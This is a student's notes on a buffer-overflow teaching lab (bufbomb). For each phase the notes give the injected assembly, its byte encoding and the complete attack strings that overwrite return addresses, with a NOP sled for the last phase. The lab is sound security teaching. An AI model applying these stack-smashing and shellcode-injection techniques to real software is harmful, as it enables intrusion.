
* [Lab 3 Notes](#lab-3-notes)
	* [Intro](#intro)
		* [Phase List](#phase-list)
		* [Basic Running Command](#basic-running-command)
			* [Get Cookie](#get-cookie)
			* [Run](#run)
			* [Attack](#attack)
	* [Ready Phase](#ready-phase)
		* [Makfile](#makfile)
	* [Analysis Phase](#analysis-phase)
	* [基本流程](#基本流程)
	* [Smoke Phase - 修改返回地址](#smoke-phase---修改返回地址)
	* [Fizz Phase - 传参](#fizz-phase---传参)
	* [Bang Phase - 修改全局变量](#bang-phase---修改全局变量)
		* [获取输入缓冲区地址,控制 getbuf 返回后跳转至攻击指令处](#获取输入缓冲区地址控制-getbuf-返回后跳转至攻击指令处)
		* [获取 `global_value` 地址, 利用汇编攻击指令将其修改为 cookie 值](#获取-global_value-地址-利用汇编攻击指令将其修改为-cookie-值)
		* [利用汇编攻击指令跳转至 bang 函数](#利用汇编攻击指令跳转至-bang-函数)
		* [生成 bang 攻击字符串](#生成-bang-攻击字符串)
		* [bang 最终攻击序列](#bang-最终攻击序列)
	* [Boom Phase - 修改返回值，恢复栈帧](#boom-phase---修改返回值恢复栈帧)
		* [获取旧 %ebp 值](#获取旧-ebp-值)
		* [编写 boom 攻击指令](#编写-boom-攻击指令)
		* [生成 boom 攻击字符串](#生成-boom-攻击字符串)
		* [boom 最终攻击序列](#boom-最终攻击序列)
	* [Nitro Phase](#nitro-phase)
		* [getbufn](#getbufn)
		* [编写 nitro 攻击指令](#编写-nitro-攻击指令)
		* [生成 nitro 攻击字符串](#生成-nitro-攻击字符串)
		* [nitro 最终攻击序列](#nitro-最终攻击序列)
	* [Bug](#bug)
		* [Stupid Bug](#stupid-bug)
		* [hex2raw Bug](#hex2raw-bug)
			* [任务书中存在兼容性问题的指令](#任务书中存在兼容性问题的指令)
			* [任务书未提及的指令](#任务书未提及的指令)
	* [Word Document](#word-document)

# Lab 3 Notes

## Intro

### Phase List

-   `smoke_U201414800.txt`
-   `fizz_U201414800.txt`
-   `bang_U201414800.txt`
-   `boom_U201414800.txt`
-   `nitro_U201414800.txt`

### Basic Running Command

#### Get Cookie

```bash
$ makecookie U201414800 && makecookie U201414800 >> cookie.txt
```

#### Run

```bash
$ ./hex2raw smoke_U201414800.txt smoke_U201414800_raw.txt
$ ./bufbomb -u U201414800 < smoke_ U201414800_raw.txt
(gdb) run -u U201414800 < smoke_ U201414800_raw.txt
```

#### Attack

```bash
$ gcc -m32 -c attack.s
$ objdump -d attack.o >> attack.asm
```

## Ready Phase

### Makfile

-   编写 Makefile，简化工作流

```makefile
# 获取可执行目标文件所有节的反汇编信息, 分析反汇编代码
dump:
	objdump -D bufbomb > bufbomb.asm && vim bufbomb.asm

# 分析 bufbomb C源码
src:
	vim bufbomb.c

# 利用 gdb 进行有限的动态分析
debug:
	gdb bufbomb

# 利用 makecookie 得到 cookie 字符串
cookie:
	./makecookie U201414800 && ./makecookie U201414800 > cookie.txt

# 编写汇编代码，并得到其机器指令码
asm:
    gcc -m32 -c attack.s
    objdump -d attack.o >> attack.asm

# 利用 hex2raw 生成攻击字符串
raw:
	cat smoke_U201414800.txt | ./hex2raw > smoke_U201414800_raw.txt
	cat fizz_U201414800.txt | ./hex2raw > fizz_U201414800_raw.txt
	cat bang_U201414800.txt | ./hex2raw > bang_U201414800_raw.txt
	cat boom_U201414800.txt | ./hex2raw > boom_U201414800_raw.txt
	cat nitro_U201414800.txt | ./hex2raw -n > nitro_U201414800_raw.txt

# 进行攻击测试
smoke:
	./bufbomb -u U201414800 < smoke_U201414800_raw.txt
fizz:
	./bufbomb -u U201414800 < fizz_U201414800_raw.txt
bang:
	./bufbomb -u U201414800 < bang_U201414800_raw.txt
boom:
	./bufbomb -u U201414800 < boom_U201414800_raw.txt
nitro:
	./bufbomb -n -u U201414800 < nitro_U201414800_raw.txt
```

-   make cookie 得到 cookie
-   make dump 得到反汇编代码

## Analysis Phase

-   launcher() -> launch() -> test()/testn() -> getbuf()/getbufn()

```c
int getbuf() {
    char buf[NORMAL_BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

-　 利用 vim 编辑器 在 bufbomb.asm 中搜索 `<getbuf>`
-   攻击字符串长度应为 0x28+0x4+0x4 = 48 bytes,最后4个字节为返回地址

```asm
080491ec <getbuf>:
80491ec:   55                      push   %ebp
80491ed:   89 e5                   mov    %esp,%ebp
80491ef:   83 ec 38                sub    $0x38,%esp
80491f2:   8d 45 d8                lea    -0x28(%ebp),%eax
80491f5:   89 04 24                mov    %eax,(%esp)
80491f8:   e8 55 fb ff ff          call   8048d52 <Gets>
80491fd:   b8 01 00 00 00          mov    $0x1,%eax
8049202:   c9                      leave
8049203:   c3                      ret
```

## 基本流程

```bash
; 静态分析 + 动态分析
make src
make dump
(make debug)

; 编写汇编代码
vim attack.s
make asm
; 得到对应机器字节码,添加必要注释
vim phase_U201414800.txt attack.asm
; 生成攻击字符串
make raw

; 进行攻击测试
make test
```

## Smoke Phase - 修改返回地址

键入 make dump,开始静态分析
利用 vim 编辑器 在 bufbomb.asm 中搜索 `<smoke>`, 得地址为 0x08048c90.
结合 linux 系统小端模式的特性,故将攻击字符串最低４个字节设为 90 8c 04 08

## Fizz Phase - 传参

键入 make dump,开始静态分析
此阶段需要传入 cookie 参数.
利用 vim 编辑器 在 bufbomb.asm 中搜索 `<fizz>`
地址为 0x08048cba

```asm
08048cba <fizz>:
8048cba:   55                      push   %ebp
8048cbb:   89 e5                   mov    %esp,%ebp
8048cbd:   83 ec 18                sub    $0x18,%esp
; 从此句可得 fizz 函数取得在 0x8(%ebp)处取得第一个参数
; 由于 push %ebp 语句的存在,故 cookie 应置于 返回地址 4 个字节第 4 个字节开始
8048cc0:   8b 45 08                mov    0x8(%ebp),%eax
; 键入 x/wx 0x804c220,输出: 0x804c220 <cookie>: 0x6898ac90
8048cc3:   3b 05 20 c2 04 08       cmp    0x804c220,%eax
8048cc9:   75 1e                   jne    8048ce9 <fizz+0x2f>
8048ccb:   89 44 24 04             mov    %eax,0x4(%esp)
8048ccf:   c7 04 24 2e a1 04 08    movl   $0x804a12e,(%esp)
8048cd6:   e8 f5 fb ff ff          call   80488d0 <printf@plt>
8048cdb:   c7 04 24 01 00 00 00    movl   $0x1,(%esp)
8048ce2:   e8 5d 06 00 00          call   8049344 <validate>
8048ce7:   eb 10                   jmp    8048cf9 <fizz+0x3f>
8048ce9:   89 44 24 04             mov    %eax,0x4(%esp)
8048ced:   c7 04 24 c4 a2 04 08    movl   $0x804a2c4,(%esp)
8048cf4:   e8 d7 fb ff ff          call   80488d0 <printf@plt>
8048cf9:   c7 04 24 00 00 00 00    movl   $0x0,(%esp)
8048d00:   e8 8b fc ff ff          call   8048990 <exit@plt>
```

0x28+0x4(%ebp)+0x4(return address)+0x8(first argument) = 56 bytes

故需在第一阶段的攻击字符串的基础上添加 00 00 00 00 90 ac 98 68

> 使用 gdb 进行调试时，发现不能像以往那样在某一行设置断点，只能在某些函数处设置断点.故 (gdb) b getbuf, 在 getbuf 函数处设置断点

## Bang Phase - 修改全局变量

### 获取输入缓冲区地址,控制 getbuf 返回后跳转至攻击指令处

键入 $ make debug, 利用 gdb 进行动态分析:

-   键入 (gdb) b getbuf, 在 getbuf 处设置断点，使程序运行至 getbuf处.
-   键入 x/wx $ebp-0x28, 输出0x55683188 <_reserved+1036680>:    0x00000000,
-   可得输入缓冲区的首址为 0x55683188, 故利用攻击字符串将攻击程序写入在此开始的 28 个字节内.

故应将 getbuf 栈帧返回地址处覆写为 88 31 68 55.

### 获取 `global_value` 地址, 利用汇编攻击指令将其修改为 cookie 值

键入 make dump , 利用 vim 编辑器在 bufbump.asm 中搜索 `global_value`, 发现其位于 .bss 节,地址为 0x0804c218.
可编写如下指令改变 `global_value` 值:

```asm
movl $0x6898ac90, 0x0804c218
```

可将 `global_value` 值修改为 cookie 值.

### 利用汇编攻击指令跳转至 bang 函数

同样地, 键入 make dump, 利用 vim 编辑器在 bufbump.asm 中搜索 `bang`, 其地址为 0x08048d05.

```asm
pushl $0x08048d05
ret
```

可跳转至 bang 函数处

### 生成 bang 攻击字符串

键入 $ vim attack.s, 编写汇编攻击指令

```asm
movl $0x6898ac90, 0x0804c218
pushl $0x08048d05
ret
```

键入 $ make asm, 将汇编指令编译成重定位目标文件(attack.o), 再将其反汇编成带机器指令码的汇编指令(attack.asm), 查看 attack.asm 可得

```asm
c7 05 18 c2 04 08 90    movl   $0x6898ac90,0x804c218
ac 98 68
68 05 8d 04 08          push   $0x8048d05
c3                      ret
```

故,可得攻击指令机器字节码为 c7 05 18 c2 04 08 90 ac 98 68 68 05 8d 04 08 c3.

### bang 最终攻击序列

```asm
c7 05 18 c2
04 08 90 ac
98 68 68 05
8d 04 08 c3
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
88 31 68 55
```

## Boom Phase - 修改返回值，恢复栈帧

根据栈帧的建立与恢复过程，此次实验需要恢复的元素有 2 个: getbuf 栈帧底部保存的 旧%ebp值(即 test 栈底地址) 与 返回地址(即 test 中位于 call <getbuf> 下一条指令的地址).
可以通过攻击指令恢复这 2 个元素

### 获取旧 %ebp 值

键入 make debug, 利用 gdb 进行动态分析:

在 getbuf 处设置断点，运行程序至 getbuf 处.
键入 x/2wx $ebp, 输出 -
0x556831b0 <_reserved+1036720>: 0x556831e0  0x08048e81.
可以得到 旧%ebp值为 0x556831e0, 程序正常运行返回地址为 0x08048e81.

### 编写 boom 攻击指令

为完成此阶段要求:

-   需将 cookie 值送入 %eax, 作为 getbuf 函数的返回值
-   恢复上述提到的 2 个元素(旧%ebp值, 正常返回地址)

```asm
; 设置返回值为 cookie
movl $0x6898ac90, %eax
; 恢复旧%ebp值
pushl $0x556831e0
popl %ebp
; 设置正常的返回地址
pushl $0x08048e81
; 返回至 test 函数
ret
```

### 生成 boom 攻击字符串

编写好 attack.s 后, 键入 $ make asm, 获得对应机器字节码:

```asm
b8 90 ac 98 68          mov    $0x6898ac90,%eax
68 e0 31 68 55          push   $0x556831e0
5d                      pop    %ebp
68 81 8e 04 08          push   $0x8048e81
c3                      ret
```

b8 90 ac 98 68 68 e0 31 68 55 5d 68 81 8e 04 08 c3

同样地, 与 bang 阶段相同，将 getbuf 栈帧的返回地址覆写为 88 31 68 55.

### boom 最终攻击序列

故，可得攻击序列为:

```asm
b8 90 ac 98
68 68 e0 31
68 55 5d 68
81 8e 04 08
c3 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
88 31 68 55
```

## Nitro Phase

### getbufn

0x208+0x4+0x4 = 528 bytes

多次运行 launcher() -> launch() -> testn() -> getbufn(), 发现 getbufn 的 %ebp 值总在以下 5 个值变化:

(gdb) x/2wx $ebp

-   0x556831b0 <_reserved+1036720>: 0x556831e0  0x08048e15
-   0x55683130 <_reserved+1036592>: 0x55683160  0x08048e15
-   0x55683150 <_reserved+1036624>: 0x55683180  0x08048e15
-   0x556831e0 <_reserved+1036768>: 0x55683210  0x08048e15
-   0x55683170 <_reserved+1036656>: 0x556831a0  0x08048e15

故 getbufn 的栈帧底部随机分配在 0x55683130 ~ 0x556831e0(偏移量为 176d)范围内.
且 旧%ebp值(testn 栈底) 恒为 新%ebp值(getbufn 栈底)+0x30.
且 正常返回地址恒为 0x08048e15.

故，需将 getbufn 的返回地址覆写为 0x556831e0-0x208 = 0x55682fd8, 且至少插入 176d 个 nop(0x90) 指令.
完成以上 2 个操作，才能确保每次攻击都能奏效.

(gdb) x/132wx $ebp-0x208

### 编写 nitro 攻击指令

为完成此阶段要求:

-   需将 cookie 值送入 %eax, 作为 getbufn 函数的返回值
-   恢复 旧%ebp值
-   恢复 正常返回地址

```asm
; 恢复旧%ebp值
; 由于 旧%ebp值(testn 栈底) 恒为 新%ebp值(getbufn 栈底)+0x30.
; 故, 可通过当前 %esp 所指位置，计算出 testn 的栈底地址
lea 0x28(%esp), %ebp
; 设置返回值为 cookie
movl $0x6898ac90, %eax
; 设置正常的返回地址
pushl $0x08048e15
; 返回至 testn 函数
ret
```

### 生成 nitro 攻击字符串

编写好 attack.s 后, 键入 $ make asm, 获得对应机器字节码:

```asm
8d 6c 24 28             lea    0x28(%esp),%ebp
b8 90 ac 98 68          mov    $0x6898ac90,%eax
68 15 8e 04 08          push   $0x8048e15
c3                      ret
```

8d 6c 24 28 b8 90 ac 98 68 68 15 8e 04 08 c3

### nitro 最终攻击序列

故，可得攻击序列为:

```asm
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
90 90 90 90
8d 6c 24 28
b8 90 ac 98
68 68 15 8e
04 08 c3 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
d8 2f 68 55
```

## Bug

### Stupid Bug

在进行 bang 阶段的攻击时，由于在倒数第二行添加注释时，后半部分注释与 */ 间没有空格，导致解析错误，只成功将攻击指令注入了输入缓冲区，但没有成功修改 getbuf 栈帧的返回地址，导致 getbuf 正常返回，攻击失败。
在之后的攻击中，开始重视注释格式.

### hex2raw Bug

#### 任务书中存在兼容性问题的指令

键入以下指令，发现系统无响应:

```bash
$ ./hex2raw smoke_U201414800.txt > smoke_U201414800_raw.txt
```

修改成以下形式后，才能正常生成 raw 文件:

```bash
$ cat smoke_U201414800.txt | ./hex2raw > smoke_U201414800_raw.txt
```

#### 任务书未提及的指令

在进行 nitro 阶段的攻击时，由于 getbufn 会被调用 5 次，故应将攻击序列复制5次.

```bash
cat nitro_U201414800.txt | ./hex2raw -n > nitro_U201414800_raw.txt
```

## Word Document

编写报告时，结合以下文档进行编写

-   lab3.md
-   phase_U201414800.txt 注释
-   attack.asm
-   bufbomb.asm
